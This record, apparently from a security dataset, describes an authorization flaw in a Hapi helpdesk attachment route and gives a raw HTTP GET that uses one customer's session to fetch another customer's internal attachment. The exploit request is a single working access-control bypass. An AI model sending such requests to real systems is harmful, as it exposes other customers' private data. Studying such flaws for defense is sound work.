diagnosis: The ticket attachment route in Hapi relies on a pre-handler to check role membership, but retrieves the attachment entity solely by attachmentId. It omits checking whether the parent ticket belongs to the authenticated customer, exposing private troubleshooting attachments across customer accounts.
exploit_request:
GET /support/tickets/tkt-9002/attachments/att-internal-log-441 HTTP/1.1
Host: helpdesk.saas.com:5005
Cookie: session_id=client_alpha_session
Accept: application/json
